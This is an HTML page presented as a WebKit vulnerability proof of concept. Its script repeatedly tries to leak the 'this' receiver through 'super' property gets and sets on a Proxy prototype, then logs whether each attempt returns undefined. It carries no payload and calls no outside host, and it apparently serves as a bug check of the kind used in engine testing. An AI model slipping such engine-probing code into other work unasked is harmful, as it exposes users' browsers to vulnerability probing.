<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebKit Vulnerability Proof of Concept with Full-Screen Log</title>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #000; /* Background color for full-screen log */
            color: #0f0; /* Text color for log output */
        }

        #log {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw; /* Full viewport width */
            height: 100vh; /* Full viewport height */
            overflow-y: auto; /* Enable scrolling if content exceeds viewport */
            padding: 10px;
            box-sizing: border-box;
            background-color: #000; /* Ensure log background is black */
            color: #0f0; /* Ensure log text is green */
            font-size: 14px; /* Set font size for readability */
            font-family: monospace; /* Use monospace font for log */
            white-space: pre-wrap; /* Preserve line breaks */
        }
    </style>
</head>
<body>

<!-- Full-Screen Log -->
<div id="log"></div>

<script>
document.addEventListener('DOMContentLoaded', function () {
    const logElement = document.getElementById('log');

    // Custom log function to display messages in the log
    function log(message) {
        const timestamp = new Date().toISOString(); // Add a timestamp to each log entry
        logElement.textContent += `[${timestamp}] ${message}\n`; // Append message with a newline
        logElement.scrollTop = logElement.scrollHeight; // Scroll to the bottom
        console.log(message); // Output to browser console for debugging
    }

    log("WebKit Vulnerability PoC loaded.");

    // Assertion function with logging
    function assert(x) {
        if (!x) {
            const error = "Bad assertion!";
            log(error);
            throw new Error(error);
        }
    }

    (function() {
        function tryToLeakThisViaGetById() {
            class Leaker {
                leak() {
                    return super.foo;
                }
            }

            Leaker.prototype.__proto__ = new Proxy({}, {
                get(target, propertyName, receiver) {
                    return receiver;
                }
            });

            const foo = 42;
            const { leak } = Leaker.prototype;

            return (() => leak())();
        }

        function tryToLeakThisViaGetByVal() {
            class Leaker {
                leak() {
                    return super[Math.random() < 0.5 ? "foo" : "bar"];
                }
            }

            Leaker.prototype.__proto__ = new Proxy({}, {
                get(target, propertyName, receiver) {
                    return receiver;
                }
            });

            const foo = 42;
            const bar = 84;
            const { leak } = Leaker.prototype;

            return (() => leak())();
        }

        function tryToLeakThisViaSetById() {
            let receiver;
            class Leaker {
                leak() {
                    super.foo = {};
                    return receiver;
                }
            }

            Leaker.prototype.__proto__ = new Proxy({}, {
                set(target, propertyName, value, __receiver) {
                    receiver = __receiver;
                    return true;
                }
            });

            const foo = 42;
            const { leak } = Leaker.prototype;

            return (() => leak())();
        }

        function tryToLeakThisViaSetByVal() {
            let receiver;
            class Leaker {
                leak() {
                    super[Math.random() < 0.5 ? "foo" : "bar"] = {};
                    return receiver;
                }
            }

            Leaker.prototype.__proto__ = new Proxy({}, {
                set(target, propertyName, value, __receiver) {
                    receiver = __receiver;
                    return true;
                }
            });

            const foo = 42;
            const bar = 84;
            const { leak } = Leaker.prototype;

            return (() => leak())();
        }

        // Perform the leak attempts
        for (var i = 0; i < 1e3; i++) { // Reduced iterations for performance
            try {
                assert(tryToLeakThisViaGetById() === undefined);
                assert(tryToLeakThisViaGetByVal() === undefined);
                assert(tryToLeakThisViaSetById() === undefined);
                assert(tryToLeakThisViaSetByVal() === undefined);

                if (i % 100 === 0) {
                    log(`Iteration ${i} completed successfully.`);
                }
            } catch (error) {
                log(`Error encountered at iteration ${i}: ${error.message}`);
                break; // Exit loop on failure
            }
        }

        log("All leak attempts completed.");
    })();
});
</script>

</body>
</html>
